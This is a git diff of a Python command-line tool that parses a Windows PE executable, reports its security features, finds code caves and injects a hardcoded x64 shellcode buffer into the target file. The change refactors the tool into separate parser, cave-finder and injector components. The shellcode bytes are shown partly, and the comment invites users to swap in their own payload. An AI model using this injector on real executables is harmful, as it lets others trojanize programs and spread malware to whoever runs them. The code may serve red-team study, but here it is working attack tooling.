@@ -1,7 +1,10 @@
-from utils.parser import PEAnalyzer
+from utils.parser import PEParser
+from utils.codecaver import CodeCaver
+from utils.injector import ShellcodeInjector
+from utils.logger import *
 import sys
-import json
 
+# Test shellcode (you can replace this with your own)
 buf = b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x30\x4c\x8b\x0e\x4d"
 buf+=b"\x8b\x09\x4d\x8b\x49\x10\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
 buf+=b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
@@ -28,67 +31,53 @@ buf+=b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\
 buf+=b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"
 
 
-hex_string = ''.join(f'{byte:02x}' for byte in buf)
-
-
-
-
-def print_section(title: str, content: any, indent: int = 0):
-    """Helper function to print formatted sections"""
-    print("\n" + "=" * 50)
-    print(f"{title}:")
-    print("-" * 50)
-    if isinstance(content, dict):
-        for key, value in content.items():
-            print(" " * indent + f"{key}: {value}")
-    elif isinstance(content, list):
-        for item in content:
-            if isinstance(item, dict):
-                for k, v in item.items():
-                    print(" " * indent + f"{k}: {v}")
-                print("-" * 30)
-            else:
-                print(" " * indent + str(item))
-    else:
-        print(" " * indent + str(content))
-
 def main():
-    # if len(sys.argv) != 2:
-    #     print("Usage: python main.py <path_to_pe_file>")
-    #     sys.exit(1)
+    if len(sys.argv) != 2:
+        print("Usage: python main.py <path_to_pe_file>")
+        sys.exit(1)
 
-    # pe_path = sys.argv[1]
-    pe_path = "C:\\Users\\MaorBuskila\\Documents\\calc.exe"
+    pe_path = sys.argv[1]
     try:
-        analyzer = PEAnalyzer(pe_path)
-        print(hex_string)
+        # Initialize components
+        parser = PEParser(pe_path)
+        caver = CodeCaver(parser)
+        injector = ShellcodeInjector(parser, caver)
 
-        architecture = analyzer.check_pe_architecture()
-        print(f"The PE file is {architecture}.")
+        # Print basic PE information
+        print_header("PE File Analysis")
+        architecture = parser.check_pe_architecture()
+        print(f"Architecture: {architecture}")
+
         # Security features check
-        print_section("Security Features", analyzer.check_aslr())
+        print_section("Security Features", parser.check_security_features())
 
         # Basic headers
-        print_section("File Headers", analyzer.get_file_headers())
+        print_section("File Headers", parser.get_file_headers())
 
-        # Sections
-        # print_section("Sections", analyzer.get_sections_info())
-
-        # Code caves
-        caves = analyzer.find_code_caves(min_size=100)
-        print_section("Code Caves", {
+        # Find code caves
+        print_header("Code Cave Analysis")
+        caves = caver.find_code_caves(min_size=100)
+        
+        # Filter and print only sections with caves
+        cave_results = {
             section: [f"Offset: {hex(offset)}, Size: {size}"
                      for offset, size in caves_list]
             for section, caves_list in caves.items()
             if caves_list
-        })
+        }
+        print_section("Code Caves Found", cave_results)
 
-        print_section("Attempting Shellcode Injection", "")
-        result = analyzer.inject_shellcode(buf)
-        print_section("Injection Result", result)
+        # Attempt shellcode injection
+        print_header("Shellcode Injection")
+        try:
+            result = injector.inject_shellcode(buf)
+            print_success("Shellcode injection completed")
+            print_section("Injection Results", result)
+        except Exception as e:
+            print_error(f"Injection failed: {str(e)}")
 
     except Exception as e:
-        print(f"Error analyzing PE file: {str(e)}")
+        print_error(f"Error analyzing PE file: {str(e)}")
         sys.exit(1)
 
 if __name__ == "__main__":
